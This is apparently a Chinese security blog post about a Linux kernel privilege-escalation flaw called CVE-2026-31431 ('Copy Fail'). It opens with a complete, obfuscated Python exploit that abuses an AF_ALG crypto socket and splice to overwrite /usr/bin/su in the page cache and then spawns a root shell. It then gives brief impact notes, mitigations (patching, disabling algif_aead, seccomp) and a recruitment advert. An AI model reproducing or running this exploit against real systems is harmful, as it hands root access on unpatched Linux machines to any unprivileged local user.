#  逆天 Linux 提权漏洞，大洞速修！！！！！  
ChinaRan404
                    ChinaRan404  知攻善防实验室   2026-04-30 01:33  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/a3etiafIAYXGcuJDxP4xUDFwv1Fowx9OeVpH3uxDLCMFvIKh2QQwWdZedkmP6YwiaF9h8cE5nmfIGPwDrib0DndIOEM29e0mZwTDAD9tFGAgUM/640?wx_fmt=png&from=appmsg "")  
  
EXP  
```
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a3etiafIAYXH7HTT88r6KjfHUjOCbB9XljyOIXwBTBAmDVzjcLRuy5ASHAPk9qibzegU6nVMk1XZxXGNib7E3oPlRUvMZ1Db7MQd5TtgKknngw/640?wx_fmt=png&from=appmsg "")  
  
CVE-2026-31431（称为 "Copy Fail"）  
  
漏洞类型：Linux 内核本地提权（LPE），通过页面缓存写入实现  
  
影响范围：  
2017 年至 2026 年 4 月补丁前的几乎所有主流 Linux 发行版  
  
利用方式：仅需一个非特权本地用户账户，无需网络访问、无需内核调试功能  
  
攻击载荷：仅 732 字节的 Python 脚本（仅使用 stdlib: os、socket、zlib）  
  
同一脚本无需修改即可拿下 Ubuntu、Amazon Linux、RHEL、SUSE 四大发行版的 root 权限。  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXE6O9PvYpOX4Ribibia9I5p3Uvmq8dfoA6A9QqI7AMweqXafLhcsuLKScTHN9X54toHdbLb2mWN1S0Ey0VrpodMzwsYwb5Yfnv724/640?wx_fmt=gif&from=appmsg "")  
  
缓解措施  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXF8z7KZpsJpbu4DtEabKcv3tiaia6ibkYPklDdjeoG2xwESfvllwdLfvcc3hAV6RthuyX5EDYqXBR6Vyo12IyC8FOiaO7sEEptxQG4/640?wx_fmt=gif&from=appmsg "")  
  
  
1. 打补丁：更新内核到包含 a664bf3d603d 提交的版本  
  
2. 临时措施：禁用 algif_aead 模块（对绝大多数系统没有可测量的影响，不影响 dm-crypt/LUKS、kTLS、SSH 等）  
  
3. 对于不可信工作负载，通过 seccomp 阻止 AF_ALG socket 创建  
  
  
相关参考链接：  
  
https://copy.fail/   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXGTt3YBx3On7CByKsZDc5lH4ZLm91I8KnFicHRBkRdr90JOorK81J0EU3vibSTZ7Nf0chz1hsJ98tecN9MIwjk30K8ZoTebrfwFA/640?wx_fmt=gif&from=appmsg "")  
  
广告时间  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXG0vUAGFCtibj0RF5icM2jibqwuh0ETf48Dx1kEjUaf3lD5H570NNEXXAu8AFIMIHF6ibJiczCYI0Gcq9icoMpLgxvpiboXkB7hfibjzP4/640?wx_fmt=gif&from=appmsg "")  
  
  
   
  
国 HVV 招聘  
  
初级研判-中级研判-高级研判  
  
月付10k-30k区间  
  
【腾讯文档】HVV 投递  
  
https://docs.qq.com/form/page/DSUNpWmtNQXhjb1Vm  
  
流程  
  
简历投递->简历初筛->投递厂商->厂商考试->厂商面试->锁定项目  
  
